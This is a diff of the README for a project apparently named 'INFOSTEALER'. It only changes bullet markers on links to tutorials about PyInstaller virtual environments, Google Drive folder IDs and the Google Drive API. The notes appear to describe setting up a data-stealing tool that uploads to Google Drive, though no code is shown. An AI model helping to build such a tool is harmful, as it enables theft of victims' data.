@@ -1,8 +1,8 @@
 # INFOSTEALER
 ----------------------------------------------------
-* python env: https://coderslegacy.com/pyinstaller-virtual-environment-with-venv/
-* folder id: https://robindirksen.com/blog/where-do-i-get-google-drive-folder-id
-* google drive bot: https://obikastanya.medium.com/easy-way-to-integrate-your-python-apps-with-google-drive-api-2f29ed0be239
+- python env: https://coderslegacy.com/pyinstaller-virtual-environment-with-venv/
+- folder id: https://robindirksen.com/blog/where-do-i-get-google-drive-folder-id
+- google drive bot: https://obikastanya.medium.com/easy-way-to-integrate-your-python-apps-with-google-drive-api-2f29ed0be239
 ----------------------------------------------------
 python -m venv [env name]
 (link)
